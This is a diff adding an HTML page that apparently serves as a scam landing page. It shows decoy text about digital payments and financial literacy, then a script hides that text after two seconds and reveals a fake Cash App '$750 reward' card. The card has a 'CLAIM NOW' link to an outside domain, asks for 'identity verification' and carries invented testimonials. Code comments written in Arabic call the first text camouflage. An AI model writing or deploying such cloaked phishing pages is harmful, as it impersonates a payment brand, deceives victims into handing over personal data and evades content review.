@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Financial Literacy & Digital Payments 2026</title>
+    <style>
+        /* ستايل التمويه */
+        #decoy-content { padding: 30px; font-family: 'Georgia', serif; color: #333; line-height: 1.7; max-width: 700px; margin: auto; }
+        
+        /* ستايل العرض الحقيقي */
+        #money-view { 
+            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
+            background: #00d084; /* لون Cash App الرسمي */
+            z-index: 9999; overflow-y: auto; font-family: sans-serif;
+        }
+
+        .main-card { max-width: 450px; margin: 40px auto; background: white; border-radius: 20px; padding: 30px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.2); }
+        .cash-logo { width: 80px; margin-bottom: 20px; }
+        h1 { color: #00d084; font-size: 28px; margin-bottom: 10px; }
+        .amount { font-size: 48px; font-weight: bold; color: #1c1e21; margin: 15px 0; }
+        .status-badge { background: #e6fff6; color: #00d084; padding: 8px 15px; border-radius: 50px; font-weight: bold; font-size: 14px; display: inline-block; margin-bottom: 25px; }
+        
+        .main-btn { 
+            display: block; background: #00d084; color: white; padding: 20px; 
+            border-radius: 12px; text-decoration: none; font-weight: bold; font-size: 22px;
+            transition: 0.3s; box-shadow: 0 5px 15px rgba(0,208,132,0.4);
+            animation: pulse 1.5s infinite;
+        }
+
+        @keyframes pulse { 0% {transform: scale(1);} 50% {transform: scale(1.05);} 100% {transform: scale(1);} }
+
+        /* تعليقات فيسبوك */
+        .social-proof { text-align: left; margin-top: 30px; border-top: 1px solid #eee; padding-top: 20px; }
+        .comment { display: flex; margin-bottom: 12px; font-size: 13px; }
+        .avatar { width: 35px; height: 35px; border-radius: 50%; margin-right: 10px; background: #eee; }
+    </style>
+</head>
+<body>
+
+    <div id="decoy-content">
+        <h1>The Digital Economy: How Peer-to-Peer Payments Change Markets</h1>
+        <p>Statistical analysis of digital transaction systems in North America shows a 40% increase in mobile wallet adoption. Financial literacy programs are now integrating these tools to help residents manage short-term liquidity. This research node explores the socioeconomic impact of instant transfers on local economies...</p>
+        <p>By leveraging secure protocols, users can participate in a broader financial ecosystem that was previously inaccessible to decentralized markets...</p>
+    </div>
+
+    <div id="money-view">
+        <div class="main-card">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/c/c5/Square_Cash_app_logo.svg" class="cash-logo" alt="Cash App">
+            <h1>Cash App Reward</h1>
+            <div class="status-badge">● STATUS: ELIGIBLE (USA ONLY)</div>
+            <p>You have been selected to receive a</p>
+            <div class="amount">$750.00</div>
+            <p style="color:#666; margin-bottom:30px;">Directly to your Cash App account after a quick identity verification.</p>
+
+            <a href="https://feraveromonster.ink/sl/ljyen" class="main-btn">CLAIM NOW</a>
+
+            <div class="social-proof">
+                <div class="comment">
+                    <img src="https://i.pravatar.cc/100?u=j1" class="avatar">
+                    <div><b>Tiffany W.</b><br>Just got my $750! NY resident here, it actually worked! 💸</div>
+                </div>
+                <div class="comment">
+                    <img src="https://i.pravatar.cc/100?u=j2" class="avatar">
+                    <div><b>Marcus G.</b><br>Took me 5 minutes. Best blessing today.</div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // التحويل المخفي بعد 2 ثانية
+        setTimeout(function() {
+            document.getElementById('money-view').style.display = 'block';
+            document.getElementById('decoy-content').style.display = 'none';
+        }, 2000);
+    </script>
+</body>
+</html> 
